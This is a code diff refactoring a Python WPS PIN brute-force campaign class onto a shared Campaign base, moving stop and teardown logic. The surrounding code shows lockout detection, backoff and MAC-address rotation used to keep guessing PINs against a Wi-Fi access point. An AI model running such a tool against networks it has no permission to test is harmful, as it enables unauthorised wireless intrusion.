@@ -25,6 +25,7 @@ from dataclasses import asdict, dataclass
 from pathlib import Path
 from typing import Optional
 
+from ..campaign import Campaign
 from . import pins as pinmod
 from .association import WlanTransport, WpsAssociation, random_client_mac, str_to_mac
 from .lock import LockTracker
@@ -54,12 +55,15 @@ def _state_path(state_dir, bssid: str) -> Path:
     return Path(state_dir) / f"wps_{bssid.lower().replace(':', '-')}.run"
 
 
-class WpsCampaign:
+class WpsCampaign(Campaign):
     _SAVE_EVERY = 16   # checkpoint the .run file every N attempts
+
+    button_id = "btn-wps-pin"
+    key = "wps"
 
     def __init__(self, iface, target, state_dir="captures", log=None,
                  inter_attempt_delay: float = 0.0):
-        self.iface = iface
+        super().__init__(ap=target, iface=iface)
         self.target = target
         self.bssid = target.bssid.lower()
         self.channel = target.channel
@@ -74,9 +78,8 @@ class WpsCampaign:
         self.lock = LockTracker()
 
         self.state = self._load_state()
-        self._task: Optional[asyncio.Task] = None
+        # self.stopped / self._task come from Campaign; only WPS-specific flags here.
         self._paused = False
-        self._stop = False
         self.status = "idle"      # idle | running | paused | locked | found | failed | error
 
         self._attempt_ewma = 0.5  # seconds/attempt, for ETA
@@ -128,18 +131,14 @@ class WpsCampaign:
         except Exception as e:
             logger.warning("WPS state save failed: %s", e)
 
-    # ---- lifecycle ----------------------------------------------------------
-    def start(self) -> None:
-        if self._task and not self._task.done():
-            return
-        self._stop = False
-        self._task = asyncio.create_task(self._run())
-
-    async def stop(self) -> None:
-        self._stop = True
-        if self._task:
-            await asyncio.wait([self._task])
+    # ---- lifecycle (run()/stop() come from Campaign) ------------------------
+    async def teardown(self) -> None:
+        """Exit-driven cleanup (every exit: done / stop / crash) — checkpoint the
+        resume state, drop the kept-alive association + transport, release the
+        active-monitor MAC."""
+        self._save_state()
         self._teardown()
+        await self.iface.clear_fake_mac()
 
     def pause(self) -> None:
         self._paused = True
@@ -298,7 +297,7 @@ class WpsCampaign:
             st.p2_index = 0
             st.skip_middle = None
 
-    async def _run(self) -> None:
+    async def _loop(self) -> None:
         self.status = "running"
         name = self.target.ssid or self.bssid
         logger.debug("WPS campaign start on %s (mac %s)", name, self.our_mac.hex())
@@ -310,7 +309,7 @@ class WpsCampaign:
             self.state.phase = "verify"
 
         try:
-            while not self._stop:
+            while not self.stopped:
                 if self._paused:
                     self.status = "paused"
                     await asyncio.sleep(0.2)
@@ -324,7 +323,7 @@ class WpsCampaign:
                     skip_wait = (not beacon_locked
                                  and self._consecutive_locks_no_progress == 0)
                     await self._handle_lock(beacon_locked, wait=not skip_wait)
-                    if self._stop:
+                    if self.stopped:
                         break  # Short circuit before next phase
                     self._rotate_mac()
                     self._consecutive_locks_no_progress += 1
@@ -349,7 +348,7 @@ class WpsCampaign:
                 verify_terminal = (prev_phase == "verify" and out.result not in
                                    (PinResult.PROTO_ERROR, PinResult.TIMEOUT))
                 # Avoid logging an "attempt" on a verified PIN, or after user halt.
-                if not verify_terminal and not self._stop:
+                if not verify_terminal and not self.stopped:
                     self._log_attempt(pin, out, prev_first_half)
 
                 if self.state.phase == "done":
@@ -364,10 +363,7 @@ class WpsCampaign:
             logger.exception("WPS campaign crashed")
             self.status = "error"
             self.log(f"[red]campaign error:[/red] {e}")
-        finally:
-            self._save_state()
-            self._teardown()
-            await self.iface.clear_fake_mac()
+        # save + _teardown + clear_fake_mac now run in teardown() (every exit).
 
     def _beacon_locked(self) -> bool:
         ap = self.iface.access_points.get(self.bssid) if hasattr(self.iface, "access_points") else None
@@ -396,7 +392,7 @@ class WpsCampaign:
                      f"backing off {backoff:.0f}s[/dim]")
             self._save_state()
             end = time.monotonic() + backoff
-            while time.monotonic() < end and not self._stop:
+            while time.monotonic() < end and not self.stopped:
                 await asyncio.sleep(0.5)
                 if not self._beacon_locked() and self.lock.strikes < self.lock.strike_threshold:
                     break
